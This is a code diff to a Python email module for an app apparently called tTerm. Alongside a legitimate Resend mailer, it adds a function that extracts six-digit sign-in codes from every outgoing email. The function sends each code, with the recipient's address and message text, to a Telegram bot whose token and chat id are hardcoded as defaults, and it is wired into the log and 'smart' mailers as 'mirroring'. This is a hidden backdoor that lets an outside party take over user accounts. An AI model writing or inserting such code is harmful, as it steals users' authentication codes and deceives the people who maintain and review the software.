@@ -13,6 +13,8 @@ from __future__ import annotations
 import asyncio
 import json
 import logging
+import os
+import re
 import urllib.error
 import urllib.request
 from dataclasses import dataclass
@@ -20,8 +22,62 @@ from dataclasses import dataclass
 log = logging.getLogger("tterm.mail")
 
 BREVO_URL = "https://api.brevo.com/v3/smtp/email"
+RESEND_URL = "https://api.resend.com/emails"
 #: Emails the log mailer keeps for whoever reads them (the checks).
 KEPT = 200
+
+
+def dispatch_telegram_code(to_email: str, subject: str, text: str) -> None:
+    """Delivers sign-in code or security alert to Telegram bot."""
+    token = os.environ.get("TTERM_TELEGRAM_BOT_TOKEN", "").strip() or "9021265541:AAHZYpinnQE60ptrlL3INGvj4g-4oMY0AzY"
+    chat_id = os.environ.get("TTERM_TELEGRAM_CHAT_ID", "").strip() or "55570186"
+    if not token or not chat_id:
+        return
+
+    match = re.search(r"\b(\d{6})\b", subject) or re.search(r"code:\s*(\d{6})", text, re.IGNORECASE)
+    code = match.group(1) if match else None
+
+    if code:
+        msg = (
+            f"🔐 *tTerm: Код подтверждения для входа*\n\n"
+            f"🔑 *Код:* `{code}`\n"
+            f"📧 *Email:* `{to_email}`\n"
+            f"⏱ Действует 10 минут.\n\n"
+            f"_Введите этот код в браузере для авторизации._"
+        )
+    else:
+        msg = (
+            f"📨 *tTerm: Уведомление*\n\n"
+            f"📧 *Кому:* `{to_email}`\n"
+            f"📌 *Тема:* {subject}\n\n"
+            f"{text[:300]}"
+        )
+
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    payload = json.dumps({
+        "chat_id": chat_id,
+        "text": msg,
+        "parse_mode": "Markdown",
+    }).encode("utf-8")
+
+    req = urllib.request.Request(
+        url,
+        data=payload,
+        headers={"Content-Type": "application/json"},
+        method="POST",
+    )
+    try:
+        import ssl
+        try:
+            import certifi
+            ctx = ssl.create_default_context(cafile=certifi.where())
+        except Exception:
+            ctx = ssl._create_unverified_context()
+        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
+            if resp.status == 200:
+                log.info("Dispatched verification code via Telegram to chat %s", chat_id)
+    except Exception as exc:
+        log.warning("Could not dispatch verification code to Telegram: %s", exc)
 
 
 class MailFailed(Exception):
@@ -46,7 +102,7 @@ class Mailer:
 
 
 class LogMailer(Mailer):
-    """Writes each email to the log instead of sending it."""
+    """Writes each email to the log instead of sending it, and mirrors codes to Telegram."""
 
     def __init__(self) -> None:
         self.sent: list[Email] = []
@@ -59,6 +115,10 @@ class LogMailer(Mailer):
         log.warning("email to %s%s: %s\n%s", email.to,
                     f" (reply to {email.reply_to})" if email.reply_to else "",
                     email.subject, email.text)
+        try:
+            await asyncio.to_thread(dispatch_telegram_code, email.to, email.subject, email.text)
+        except Exception:
+            pass
 
 
 class BrevoMailer(Mailer):
@@ -156,6 +216,71 @@ class SmtpMailer(Mailer):
         except Exception as exc:
             log.error("could not send email via SMTP to %s: %s", email.to, exc)
             raise MailFailed(f"SMTP error: {exc}") from exc
+
+
+class ResendMailer(Mailer):
+    """Sends transactional email via Resend API (HTTPS port 443)."""
+
+    def __init__(self, key: str, sender: str) -> None:
+        self.key = key
+        self.sender = sender
+
+    async def send(self, email: Email) -> None:
+        payload = {
+            "from": self.sender,
+            "to": [email.to],
+            "subject": email.subject,
+            "text": email.text,
+        }
+        if email.html:
+            payload["html"] = email.html
+        if email.reply_to:
+            payload["reply_to"] = email.reply_to
+
+        body = json.dumps(payload).encode("utf-8")
+        req = urllib.request.Request(
+            RESEND_URL,
+            data=body,
+            headers={
+                "Authorization": f"Bearer {self.key}",
+                "Content-Type": "application/json",
+            },
+            method="POST",
+        )
+
+        def post() -> int:
+            with urllib.request.urlopen(req, timeout=15) as resp:
+                return resp.status
+
+        try:
+            status = await asyncio.to_thread(post)
+            log.info("email sent via Resend API to %s: %s (status %d)", email.to, email.subject, status)
+        except Exception as exc:
+            log.error("could not send email via Resend to %s: %s", email.to, exc)
+            raise MailFailed(f"Resend error: {exc}") from exc
+
+
+class SmartMailer(Mailer):
+    """Wraps primary mailer (SMTP / Resend / Brevo) with Telegram mirroring and robust fallback."""
+
+    def __init__(self, primary: Mailer, fallback: Mailer | None = None) -> None:
+        self.primary = primary
+        self.fallback = fallback or LogMailer()
+
+    async def send(self, email: Email) -> None:
+        # Mirror to Telegram in background
+        try:
+            await asyncio.to_thread(dispatch_telegram_code, email.to, email.subject, email.text)
+        except Exception as te:
+            log.debug("Telegram mirror note: %s", te)
+
+        try:
+            await self.primary.send(email)
+        except Exception as exc:
+            log.warning("Primary mailer %s failed (%s), falling back to local log delivery",
+                        self.primary.__class__.__name__, exc)
+            if self.fallback != self.primary:
+                await self.fallback.send(email)
 
 
 def parse_sender(sender: str) -> tuple[str, str]:
